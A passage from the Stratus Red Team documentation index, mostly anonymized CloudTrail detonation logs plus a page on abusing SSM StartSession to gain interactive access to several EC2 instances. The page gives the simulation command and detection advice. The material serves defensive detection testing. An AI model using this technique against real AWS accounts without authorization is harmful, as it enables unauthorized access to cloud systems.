\"i-cfE23b1a7ceba6f86\",\n                  \"i-9D40CCFc0aE91CFa5\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.252.51.07\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.sagov-westsouth-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ea782787-a65d-4fc4-9fca-1c97869a9a25\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAW9X2Q2U25SK79UCX\",\n         \"accountId\": \"056392974792\",\n         \"arn\": \"arn:aws:iam::056392974792:user/christophe\",\n         \"principalId\": \"AIDA10CZIPPG73T21TDI\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"sagov-westsouth-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"e4be349d-0420-4ee9-b8da-7f8b76c4d883\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T09:08:42Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"056392974792\",\n      \"requestID\": \"5db544de-5064-4bf2-ba19-ea2a882281bc\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-00456A8D163f546Ff\",\n                  \"i-cfE23b1a7ceba6f86\",\n                  \"i-9D40CCFc0aE91CFa5\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.252.51.07\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.sagov-westsouth-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ea782787-a65d-4fc4-9fca-1c97869a9a25\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAW9X2Q2U25SK79UCX\",\n         \"accountId\": \"056392974792\",\n         \"arn\": \"arn:aws:iam::056392974792:user/christophe\",\n         \"principalId\": \"AIDA10CZIPPG73T21TDI\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"sagov-westsouth-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"55b6e5a7-e4e8-4b81-b822-75905525c193\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T09:08:41Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"056392974792\",\n      \"requestID\": \"2654285f-1d76-4224-9224-4a3968f16a3f\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-00456A8D163f546Ff\",\n                  \"i-cfE23b1a7ceba6f86\",\n                  \"i-9D40CCFc0aE91CFa5\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.252.51.07\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.sagov-westsouth-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ea782787-a65d-4fc4-9fca-1c97869a9a25\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAW9X2Q2U25SK79UCX\",\n         \"accountId\": \"056392974792\",\n         \"arn\": \"arn:aws:iam::056392974792:user/christophe\",\n         \"principalId\": \"AIDA10CZIPPG73T21TDI\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"sagov-westsouth-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"c0679959-5bf1-4aaf-9f78-f436c35da4b2\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T09:08:39Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"056392974792\",\n      \"requestID\": \"1545c090-8ecf-4cae-9db0-a2da1e103f23\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-00456A8D163f546Ff\",\n                  \"i-cfE23b1a7ceba6f86\",\n                  \"i-9D40CCFc0aE91CFa5\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.252.51.07\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.sagov-westsouth-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ea782787-a65d-4fc4-9fca-1c97869a9a25\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAW9X2Q2U25SK79UCX\",\n         \"accountId\": \"056392974792\",\n         \"arn\": \"arn:aws:iam::056392974792:user/christophe\",\n         \"principalId\": \"AIDA10CZIPPG73T21TDI\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"sagov-westsouth-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"bf330a73-3600-4a88-a3c9-837c82fd6431\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T09:08:38Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"056392974792\",\n      \"requestID\": \"409166a6-71c7-4a1c-b1dd-7972ec637a0c\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-00456A8D163f546Ff\",\n                  \"i-cfE23b1a7ceba6f86\",\n                  \"i-9D40CCFc0aE91CFa5\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.252.51.07\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.sagov-westsouth-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ea782787-a65d-4fc4-9fca-1c97869a9a25\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAW9X2Q2U25SK79UCX\",\n         \"accountId\": \"056392974792\",\n         \"arn\": \"arn:aws:iam::056392974792:user/christophe\",\n         \"principalId\": \"AIDA10CZIPPG73T21TDI\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"sagov-westsouth-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"d303c923-1ad3-4333-a78c-5ba0d713df14\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T09:08:37Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"056392974792\",\n      \"requestID\": \"29eb2c6a-3d0a-4b1c-b643-ad80f5faee5f\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-00456A8D163f546Ff\",\n                  \"i-cfE23b1a7ceba6f86\",\n                  \"i-9D40CCFc0aE91CFa5\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.252.51.07\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.sagov-westsouth-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ea782787-a65d-4fc4-9fca-1c97869a9a25\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAW9X2Q2U25SK79UCX\",\n         \"accountId\": \"056392974792\",\n         \"arn\": \"arn:aws:iam::056392974792:user/christophe\",\n         \"principalId\": \"AIDA10CZIPPG73T21TDI\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"sagov-westsouth-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"7cf67dfd-fedc-4494-acbe-3fab7e1808a1\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T09:08:36Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"056392974792\",\n      \"requestID\": \"9525e5ee-669c-40a2-a8d2-33cebb0ee895\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-00456A8D163f546Ff\",\n                  \"i-cfE23b1a7ceba6f86\",\n                  \"i-9D40CCFc0aE91CFa5\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.252.51.07\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.sagov-westsouth-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ea782787-a65d-4fc4-9fca-1c97869a9a25\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAW9X2Q2U25SK79UCX\",\n         \"accountId\": \"056392974792\",\n         \"arn\": \"arn:aws:iam::056392974792:user/christophe\",\n         \"principalId\": \"AIDA10CZIPPG73T21TDI\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"sagov-westsouth-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"e666a3d4-db2f-4ac2-b0ba-63531a949154\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T09:08:35Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"056392974792\",\n      \"requestID\": \"34ea6034-0028-46cd-94f5-54ffb4c5ba02\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-00456A8D163f546Ff\",\n                  \"i-cfE23b1a7ceba6f86\",\n                  \"i-9D40CCFc0aE91CFa5\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.252.51.07\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.sagov-westsouth-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ea782787-a65d-4fc4-9fca-1c97869a9a25\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAW9X2Q2U25SK79UCX\",\n         \"accountId\": \"056392974792\",\n         \"arn\": \"arn:aws:iam::056392974792:user/christophe\",\n         \"principalId\": \"AIDA10CZIPPG73T21TDI\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"sagov-westsouth-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"ff0452d7-bef3-47ba-b641-e4b10f50f3c4\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T09:08:34Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"056392974792\",\n      \"requestID\": \"135ea4ff-0e59-4771-b541-326b904dfd70\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-00456A8D163f546Ff\",\n                  \"i-cfE23b1a7ceba6f86\",\n                  \"i-9D40CCFc0aE91CFa5\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.252.51.07\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.sagov-westsouth-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ea782787-a65d-4fc4-9fca-1c97869a9a25\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAW9X2Q2U25SK79UCX\",\n         \"accountId\": \"056392974792\",\n         \"arn\": \"arn:aws:iam::056392974792:user/christophe\",\n         \"principalId\": \"AIDA10CZIPPG73T21TDI\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"sagov-westsouth-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"2253ede9-2382-41fa-8302-b25ecf0f11ac\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T09:08:33Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"056392974792\",\n      \"requestID\": \"0c664d14-0f8b-44da-896d-80b7dae05a2c\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-00456A8D163f546Ff\",\n                  \"i-cfE23b1a7ceba6f86\",\n                  \"i-9D40CCFc0aE91CFa5\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.252.51.07\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.sagov-westsouth-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ea782787-a65d-4fc4-9fca-1c97869a9a25\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAW9X2Q2U25SK79UCX\",\n         \"accountId\": \"056392974792\",\n         \"arn\": \"arn:aws:iam::056392974792:user/christophe\",\n         \"principalId\": \"AIDA10CZIPPG73T21TDI\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"sagov-westsouth-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"9b6c78ee-98ba-4ddd-9dae-aa4d3a57e89c\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T09:08:31Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"056392974792\",\n      \"requestID\": \"f55872e1-6dad-42be-a18d-c7bd64ef9f6d\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-00456A8D163f546Ff\",\n                  \"i-cfE23b1a7ceba6f86\",\n                  \"i-9D40CCFc0aE91CFa5\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.252.51.07\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.sagov-westsouth-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ea782787-a65d-4fc4-9fca-1c97869a9a25\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAW9X2Q2U25SK79UCX\",\n         \"accountId\": \"056392974792\",\n         \"arn\": \"arn:aws:iam::056392974792:user/christophe\",\n         \"principalId\": \"AIDA10CZIPPG73T21TDI\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"sagov-westsouth-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"1ac28c35-ee6f-41a4-97bd-ae8e44363660\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T09:08:30Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"056392974792\",\n      \"requestID\": \"c274e01e-2045-4415-bd71-c8744107618e\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-00456A8D163f546Ff\",\n                  \"i-cfE23b1a7ceba6f86\",\n                  \"i-9D40CCFc0aE91CFa5\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.252.51.07\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.sagov-westsouth-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ea782787-a65d-4fc4-9fca-1c97869a9a25\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAW9X2Q2U25SK79UCX\",\n         \"accountId\": \"056392974792\",\n         \"arn\": \"arn:aws:iam::056392974792:user/christophe\",\n         \"principalId\": \"AIDA10CZIPPG73T21TDI\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"sagov-westsouth-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"d3471df2-fc63-479b-9920-4ac3c9c32357\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T09:08:29Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"056392974792\",\n      \"requestID\": \"00d4a58a-00a8-4116-b391-beaa8aa1c0db\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-00456A8D163f546Ff\",\n                  \"i-cfE23b1a7ceba6f86\",\n                  \"i-9D40CCFc0aE91CFa5\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.252.51.07\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.sagov-westsouth-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ea782787-a65d-4fc4-9fca-1c97869a9a25\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAW9X2Q2U25SK79UCX\",\n         \"accountId\": \"056392974792\",\n         \"arn\": \"arn:aws:iam::056392974792:user/christophe\",\n         \"principalId\": \"AIDA10CZIPPG73T21TDI\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"sagov-westsouth-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"0745f3f1-b181-4395-a2dc-243becae570e\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T09:08:28Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"056392974792\",\n      \"requestID\": \"4b2f5fd6-3620-4aa7-bf3e-7da9d27bec85\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-00456A8D163f546Ff\",\n                  \"i-cfE23b1a7ceba6f86\",\n                  \"i-9D40CCFc0aE91CFa5\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.252.51.07\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.sagov-westsouth-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ea782787-a65d-4fc4-9fca-1c97869a9a25\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAW9X2Q2U25SK79UCX\",\n         \"accountId\": \"056392974792\",\n         \"arn\": \"arn:aws:iam::056392974792:user/christophe\",\n         \"principalId\": \"AIDA10CZIPPG73T21TDI\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"sagov-westsouth-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"804c4178-75cd-4d83-b04f-960f47961a75\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T09:08:24Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"056392974792\",\n      \"requestID\": \"bec61003-0f60-45c0-9256-116efb6d15aa\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-00456A8D163f546Ff\",\n                  \"i-cfE23b1a7ceba6f86\",\n                  \"i-9D40CCFc0aE91CFa5\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.252.51.07\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.sagov-westsouth-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ea782787-a65d-4fc4-9fca-1c97869a9a25\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAW9X2Q2U25SK79UCX\",\n         \"accountId\": \"056392974792\",\n         \"arn\": \"arn:aws:iam::056392974792:user/christophe\",\n         \"principalId\": \"AIDA10CZIPPG73T21TDI\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"sagov-westsouth-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"73518501-d83c-4d7e-8dbd-2154928d76f7\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T09:08:22Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"056392974792\",\n      \"requestID\": \"4c950f64-59ff-4fce-9a69-32ef10f96872\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-00456A8D163f546Ff\",\n                  \"i-cfE23b1a7ceba6f86\",\n                  \"i-9D40CCFc0aE91CFa5\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.252.51.07\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.sagov-westsouth-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ea782787-a65d-4fc4-9fca-1c97869a9a25\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAW9X2Q2U25SK79UCX\",\n         \"accountId\": \"056392974792\",\n         \"arn\": \"arn:aws:iam::056392974792:user/christophe\",\n         \"principalId\": \"AIDA10CZIPPG73T21TDI\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"sagov-westsouth-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"6e3e5c56-66d8-4e23-9a89-8498651357d5\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T09:08:20Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"056392974792\",\n      \"requestID\": \"8c004773-45de-49ee-aab8-44a83effbfd6\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-00456A8D163f546Ff\",\n                  \"i-cfE23b1a7ceba6f86\",\n                  \"i-9D40CCFc0aE91CFa5\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.252.51.07\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.sagov-westsouth-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ea782787-a65d-4fc4-9fca-1c97869a9a25\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAW9X2Q2U25SK79UCX\",\n         \"accountId\": \"056392974792\",\n         \"arn\": \"arn:aws:iam::056392974792:user/christophe\",\n         \"principalId\": \"AIDA10CZIPPG73T21TDI\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   }\n]\n</code></pre> <ol> <li> <p>These logs have been gathered from a real detonation of this technique in a test environment using Grimoire, and anonymized using LogLicker.\u00a0\u21a9</p> </li> </ol>"},{"location":"attack-techniques/AWS/aws.execution.ssm-start-session/","title":"Usage of ssm:StartSession on multiple instances","text":"<p>slow idempotent </p> <p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.execution.ssm-start-session/#mappings","title":"Mappings","text":"<ul> <li>MITRE ATT&amp;CK<ul> <li>Execution</li> </ul> </li> </ul>"},{"location":"attack-techniques/AWS/aws.execution.ssm-start-session/#description","title":"Description","text":"<p>Simulates an attacker utilizing AWS Systems Manager (SSM) StartSession to gain unauthorized interactive access to multiple EC2 instances.</p> <p>Warm-up:</p> <ul> <li>Create multiple EC2 instances and a VPC (takes a few minutes).</li> </ul> <p>Detonation: </p> <ul> <li>Initiates a connection to the EC2 for a Session Manager session.</li> </ul> <p>References:</p> <ul> <li>https://awstip.com/responding-to-an-attack-in-aws-9048a1a551ac (evidence of usage in the wild)</li> <li>https://hackingthe.cloud/aws/post_exploitation/run_shell_commands_on_ec2/#session-manager</li> <li>https://unit42.paloaltonetworks.com/cloud-lateral-movement-techniques/</li> </ul>"},{"location":"attack-techniques/AWS/aws.execution.ssm-start-session/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.execution.ssm-start-session\n</code></pre>"},{"location":"attack-techniques/AWS/aws.execution.ssm-start-session/#detection","title":"Detection","text":"<p>Identify, through CloudTrail's <code>StartSession</code> event, when a user is starting an interactive session to multiple EC2 instances. Sample event:</p> <pre><code>{\n  \"eventSource\": \"ssm.amazonaws.com\",\n  \"eventName\": \"StartSession\",\n  \"requestParameters\": {\n    \"target\": \"i-123456\"\n  },\n  \"responseElements\": {\n        \"sessionId\": \"...\",\n        \"tokenValue\": \"Value hidden due to security reasons.\",\n        \"streamUrl\": \"wss://ssmmessages.eu-west-1.amazonaws.com/v1/data-channel/...\"\n   },\n}\n</code></pre>"},{"location":"attack-techniques/AWS/aws.execution.ssm-start-session/#detonation-logs-new","title":"Detonation logs new!","text":"<p>The following CloudTrail events are generated when this technique is detonated<sup>1</sup>:</p> <ul> <li> <p><code>ssm:DescribeInstanceInformation</code></p> </li> <li> <p><code>ssm:StartSession</code></p> </li> <li> <p><code>ssm:TerminateSession</code></p> </li> </ul> View raw detonation logs <pre><code>[\n   {\n      \"awsRegion\": \"me-northwest-3r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"ab04bb55-b6d5-492b-8697-9d11867c6c43\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      